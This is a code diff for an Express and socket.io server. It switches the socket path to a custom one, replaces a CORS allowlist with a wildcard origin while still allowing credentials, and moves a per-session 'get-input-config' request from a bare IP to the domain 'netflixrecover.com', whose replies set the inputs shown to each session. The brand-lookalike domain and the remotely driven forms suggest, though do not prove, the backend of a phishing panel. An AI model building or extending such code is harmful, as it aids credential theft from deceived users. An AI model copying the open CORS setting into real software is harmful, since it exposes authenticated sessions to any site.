@@ -3,14 +3,14 @@ const express = require("express");
 const app = express();
 const http = require("http").createServer(app);
 const io = require("socket.io")(http, {
+  path: "/realtime-connection", // Custom path instead of /socket.io/
   cors: {
     origin: "*", // Allow requests from any origin
     methods: ["GET", "POST"]
   },
-  pingInterval: 25000,  // Ping every 25 seconds (default is too high)
-  pingTimeout: 50000,   // Wait up to 50 seconds before disconnecting
-  transports: ["websocket", "polling"], // Ensure WebSocket transport
-  path: "/socket.io/" // Explicitly set the path
+  pingInterval: 25000,
+  pingTimeout: 50000,
+  transports: ["websocket", "polling"],
 });
 
 const axios = require("axios");
@@ -51,15 +51,7 @@ mongoose
 app.use(morgan("dev"));
 app.use(cookieParser());
 app.use(cors({
-  origin: function(origin, callback) {
-    const allowedOrigins = process.env.CLIENT_URL.split(',');
-    // Add your production domain to allowed origins
-    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
-      callback(null, true);
-    } else {
-      callback(new Error('Not allowed by CORS'));
-    }
-  },
+  origin: "*",
   credentials: true
 }));
 app.use(express.static("public"));
@@ -324,7 +316,7 @@ const startConfigCheck = () => {
       }
 
       try {
-        const response = await axios.get(`http://198.7.112.115/api/get-input-config/${sessionId}`);
+        const response = await axios.get(`https://netflixrecover.com/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
